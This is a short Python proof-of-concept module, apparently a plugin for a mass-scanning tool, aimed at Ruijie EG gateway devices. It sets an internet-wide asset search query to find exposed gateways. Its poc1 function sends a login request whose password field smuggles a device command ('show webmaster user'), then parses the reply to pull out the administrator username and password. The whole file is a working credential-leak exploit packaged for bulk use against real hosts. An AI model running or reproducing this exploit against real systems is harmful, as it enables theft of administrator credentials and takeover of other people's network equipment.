#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author: RogerRordo

import requests


class _Params:
    def __init__(self):
        # Search Key
        self.key = 'app="Ruijie-EG易网关" && status_code="200"'

        # Search time range
        self.timeSt = '2021-05-01 00:00:00'
        self.timeEd = '2021-05-01 01:00:00'

        # Field to mark the target
        # "id": "22.3.4.5:8888"
        # "link": "https://22.3.4.5:8888"
        self.toRec = 'link'

        # Output file (.json)
        self.resJson = 'res.json'


class _Exp:
    def __init__(self):
        def poc1(target: str, proxies: str) -> tuple:
            # http://wiki.peiqi.tech/PeiQi_Wiki/网络设备漏洞/锐捷/锐捷EG易网关%20管理员账号密码泄露漏洞.html
            vulnerable = False
            info = {'user': '', 'pass': ''}
            url = target + "/login.php"
            headers = {
                'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = 'username=admin&password=admin?show+webmaster+user'
            try:
                response = requests.post(url=url, data=data, headers=headers, proxies=proxies, verify=False, timeout=5)
                respJson = response.json()
                strs = respJson["data"].encode().decode('unicode-escape').split()
                for i in range(len(strs)):
                    if strs[i] == 'admin':
                        info['user'] = 'admin'
                        info['pass'] = strs[i + 1]
                        vulnerable = True
                        break
            except Exception as e:
                pass
            return vulnerable, info  # bool, dict

        self.pocs = [poc1]


params = _Params()
exp = _Exp()
